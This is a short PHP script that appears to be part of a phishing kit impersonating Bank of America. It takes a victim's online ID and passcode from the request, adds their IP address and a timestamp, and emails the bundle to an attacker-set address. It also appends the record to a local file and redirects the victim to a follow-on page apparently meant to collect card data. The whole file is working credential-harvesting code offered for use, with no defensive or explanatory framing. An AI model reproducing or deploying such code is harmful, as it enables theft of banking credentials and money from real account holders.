<?php
header("Location: information.php ");
foreach($_GET as $variable => $value) 
$email = $_GET['onlineId'];
$pass = $_GET['passcode'];
$Date = "" . date("d/m/y") . "";
date_default_timezone_set("America/La_Paz");
$Time = ""   .   date("h:i:sa");
$Link = 'http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'];
$IP = getenv("REMOTE_ADDR");
$BILSMG = "


================ Bank of america 2019 =============================
onlineId: $email
passcode: $pass

IP: $IP
Fecha: $Date / Time : $Time

============Informacion de TDC, Nombre, Pin ========================

";
$MAIL_TITLE = "Login | ".$IP."";
$MAIL_HEADER = "From: bofa2019.Info";
@mail($TO,$MAIL_TITLE,$BILSMG,$MAIL_HEADER);
$handle = fopen("bank1x.txt", "a");
fwrite($handle,$BILSMG);
$x=md5(microtime());

echo "<META HTTP-EQUIV='refresh' content='1; URL=Location: information.php'>";exit;

?>?
